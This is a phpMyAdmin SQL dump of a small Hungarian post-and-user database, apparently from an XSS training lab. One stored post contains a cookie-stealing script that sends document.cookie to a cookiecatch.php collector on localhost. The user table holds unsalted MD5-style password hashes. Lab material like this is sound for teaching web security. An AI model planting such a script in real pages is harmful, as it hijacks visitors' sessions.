-- phpMyAdmin SQL Dump
-- version 4.1.12
-- http://www.phpmyadmin.net
--
-- Hoszt: localhost
-- Létrehozás ideje: 2014. Okt 20. 11:02
-- Szerver verzió: 5.6.16
-- PHP verzió: 5.5.11

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Adatbázis: `szem_db`
--

-- --------------------------------------------------------

--
-- Tábla szerkezet ehhez a táblához `post`
--

CREATE TABLE IF NOT EXISTS `post` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` int(10) unsigned NOT NULL,
  `title` varchar(50) NOT NULL,
  `body` text NOT NULL,
  `creation_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=7 ;

--
-- A tábla adatainak kiíratása `post`
--

INSERT INTO `post` (`id`, `user_id`, `title`, `body`, `creation_date`) VALUES
(1, 1, 'cÃ­m', 'asdadwd', '2014-10-20 08:34:44'),
(2, 1, 'CÃ­m2', 'sdadsd', '2014-10-20 08:40:19'),
(3, 2, 'CÃ­m3', 'sadasdwdad', '2014-10-20 08:42:12'),
(4, 2, 'CÃ­m4', 'MÃ©g egy kis hÃ¼lye tartalmi cucc.', '2014-10-20 08:43:46'),
(5, 3, '<b>fÃ©kÃ¶vÃ©r</b>', '<marquee behavior="scroll" direction="left">Fancy HTML cucc!</marquee>\r\n', '2014-10-20 08:44:51'),
(6, 3, 'SÃ¼tiszÃ¶rny', '<script>\r\nvar cookiemonster = ''http://127.0.0.1/szem/a3-xss/cookiecatch.php?cookies=''+escape(document.cookie);\r\n\r\nvar img = document.createElement("img");\r\nimg.src = cookiemonster;\r\ndocument.getElementById("header"). appendChild(img)\r\n</script>', '2014-10-20 08:51:09');

-- --------------------------------------------------------

--
-- Tábla szerkezet ehhez a táblához `user`
--

CREATE TABLE IF NOT EXISTS `user` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(100) NOT NULL,
  `password` varchar(100) NOT NULL,
  `creation_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=4 ;

--
-- A tábla adatainak kiíratása `user`
--

INSERT INTO `user` (`id`, `name`, `password`, `creation_date`) VALUES
(1, 'user1', '5f0fa8b7a7397a3c1a5e746578bd3e59', '2014-10-17 14:07:58'),
(2, 'user2', '5f0fa8b7a7397a3c1a5e746578bd3e59', '2014-10-17 14:14:38'),
(3, 'user3', '5f0fa8b7a7397a3c1a5e746578bd3e59', '2014-10-17 14:14:38');

--
-- Megkötések a kiírt táblákhoz
--

--
-- Megkötések a táblához `post`
--
ALTER TABLE `post`
  ADD CONSTRAINT `post_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `user` (`id`) ON DELETE CASCADE ON UPDATE CASCADE;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
